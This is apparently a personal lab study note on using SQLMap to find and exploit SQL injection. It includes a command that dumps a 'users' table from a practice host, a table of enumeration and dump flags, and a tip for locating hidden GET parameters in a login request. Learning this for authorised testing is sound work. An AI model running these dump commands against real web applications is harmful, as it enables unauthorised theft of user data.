---
date: 2026-03-04
tags:
  - sql
  - exploitation
  - offensive-security
---
# Automated SQL Injection Tool
---
SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.

Example Usage:
```shell
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump
```


Common flags:

| Flag                             | Description                                                                   |
| -------------------------------- | ----------------------------------------------------------------------------- |
| --wizard                         | The tool guides you through each step and ask questions to complete the scan. |
| --dbs                            | Helps you to extract all the database names.                                  |
| -D <DATABASE_NAME>               | Once you know the database name, specify it.                                  |
| --tables                         | Helps you extract information about tables of a specific database.            |
| -T <TABLE_NAME>                  | Once you know the table name, specify it.                                     |
| -u                               | Tests a URL that uses GET parameters to retreive data for vulnerabilities.    |
| --cookie (PHPSESSID, JSESSIONID) | Assigns the scan a cookie.                                                    |
| --level=                         | Increase scan depth.                                                          |

## What if the GET parameter is not visible in the URL?
Inspect the web page and go to the Network tab to find the GET request.
![](../PNG%20PDF%20JPEG/attachment-03042026.png)

Then append it to the web URL and feed it to SQLMap.
Example:
```shell
http://10.64.186.150/ai/includes/user_login?email=test&password=test
```

